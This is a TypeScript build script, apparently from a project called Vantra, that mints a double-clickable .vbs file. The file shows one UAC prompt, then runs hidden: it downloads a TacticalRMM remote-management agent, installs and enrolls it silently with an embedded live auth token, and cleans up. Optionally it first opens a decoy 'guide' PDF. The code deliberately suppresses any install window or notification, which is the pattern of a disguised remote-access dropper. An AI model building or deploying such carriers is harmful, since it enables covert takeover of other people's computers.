// TASK_177 follow-up — mint a single-file Vantra/TacticalRMM agent install
// carrier (.vbs) from OUR RMM dashboard's PowerShell install script.
//
// SEPARATE from the OpenFrame pipeline on purpose (owner directive): the
// openframe mint script and lib stay byte-identical to their Windows-tested
// state; this is its own script against lib/vantra-carrier.ts.
//
// Usage (run from repo root):
//   npx tsx scripts/mint-vantra-carrier.ts \
//     --script <path/to/install.ps1> \
//     [--out out/vantra-agent-carrier.vbs] [--no-elevate] \
//     [--pdf <guide.pdf>] [--pdf-name "Guide.pdf"] [--pdf-delay 2]
//
// TASK_179 stage 2:
//   --pdf         embed a guide PDF (decode → wait → open → install, zip
//                 parity). Validation is fail-closed in carrierPdfStatement.
//   --pdf-name    temp file name inside %TEMP% (default: the file's basename)
//   --pdf-delay   seconds before opening the guide (default 2, 0–120)
//   The enroll command now gets the `ensureSilentEnroll` fix the UI flow
//   ships (TASK_178): `--silent` is inserted before rendering, so no
//   TacticalRMM install GUI/notification appears — same bytes the route
//   mints. Fail closed if the script has no `-m install` enroll to silence.
//
// The input script contains your RMM account's LIVE auth token — keep it
// outside the repo (or in a gitignored path). Output defaults to out/
// (gitignored); a minted carrier embeds the token and MUST NOT be committed.
//
// The rendered .vbs is double-clickable on Windows: one UAC prompt, then the
// script runs hidden (download agent exe → silent install → enroll → cleanup).
import { writeFileSync, mkdirSync, readFileSync, existsSync } from "node:fs";
import { basename, dirname, resolve } from "node:path";

import {
  ensureAgentCleanSlate,
  ensureSilentEnroll,
  normalizePowerShellCommand,
  renderCarrierVbs,
} from "../lib/vantra-carrier";

function arg(name: string): string | undefined {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : undefined;
}

const scriptPath = arg("script");
if (!scriptPath) {
  console.error(
    "error: missing required arg: --script <path/to/install.ps1>\n" +
      "Point it at the PowerShell install script your RMM dashboard hands out " +
      "(the multi-line one that downloads the agent and runs `tacticalrmm.exe -m install …`).",
  );
  process.exit(1);
}
const scriptFile = resolve(scriptPath);
if (!existsSync(scriptFile)) {
  console.error(`error: script not found: ${scriptFile}`);
  process.exit(1);
}

const elevate = !process.argv.includes("--no-elevate");
const out = resolve(arg("out") ?? "out/vantra-agent-carrier.vbs");

// --- TASK_179 stage 2: optional guide PDF (base64 + validated by the lib) ---
let pdf: { pdfBase64: string; pdfName?: string; delaySec?: number } | undefined;
const pdfPath = arg("pdf");
if (pdfPath) {
  const pdfFile = resolve(pdfPath);
  if (!existsSync(pdfFile)) {
    console.error(`error: pdf not found: ${pdfFile}`);
    process.exit(1);
  }
  const delayRaw = arg("pdf-delay");
  const delaySec = delayRaw === undefined ? 2 : Number(delayRaw);
  pdf = {
    pdfBase64: readFileSync(pdfFile).toString("base64"),
    pdfName: arg("pdf-name") ?? basename(pdfFile),
    delaySec,
  };
}

let vbs: string;
let silentApplied = false;
try {
  // Mirror the route mint exactly (lib/vantra-link.ts): flatten → silence
  // the enroll → clean-slate (TASK_182: uninstall any pre-existing agent
  // before enrolling) → render. ensureSilentEnroll is a no-op when
  // `--silent` is already in the dashboard script, and throws on scripts
  // with no enroll.
  const flat = normalizePowerShellCommand(readFileSync(scriptFile, "utf8"));
  const silent = ensureSilentEnroll(flat);
  silentApplied = silent !== flat;
  vbs = renderCarrierVbs(ensureAgentCleanSlate(silent), { elevate, pdf });
} catch (err) {
  const code = (err as Error).message;
  if (code === "enroll_not_found" || code === "enroll_unrecognized") {
    console.error(
      `error: ${code} — the script must contain the TacticalRMM enroll line ` +
        "(`-m install …`) so it can be made silent. Refusing to mint a carrier " +
        "that would show the install GUI.",
    );
  } else if (code === "command_too_long") {
    console.error(
      "error: command_too_long — the bindable command exceeds Windows' 32,767-char " +
        "process command line (the failure mode: PowerShell never launches and the box " +
        "says 'The parameter is incorrect'). Split or shorten the install script.",
    );
  } else {
    console.error(`error: ${code} (in ${scriptFile})`);
    console.error(
      "The script must be one complete statement per line, with no here-strings, " +
        "multi-line string literals, interpolating double quotes, or trailing " +
        "continuation characters. Flatten those by hand and retry. For --pdf, the " +
        "file must start with %PDF and --pdf-name must be a bare `Guide.pdf` basename.",
    );
  }
  process.exit(1);
}

try {
  mkdirSync(dirname(out), { recursive: true });
  writeFileSync(out, vbs, { mode: 0o600 });
  console.log(
    `minted ${out} (elevate=${elevate}, silent=${silentApplied ? "applied" : "already-present"}, ` +
      `pdf=${pdf ? `${pdf.pdfName} (${Math.round((pdf.pdfBase64.length * 3) / 4 / 1024)} KB, delay ${pdf.delaySec}s)` : "none"})`,
  );
  console.log("copy to the Windows device and double-click; one UAC prompt, then hidden.");
} catch (err) {
  console.error(`error: ${(err as Error).message}`);
  process.exit(1);
}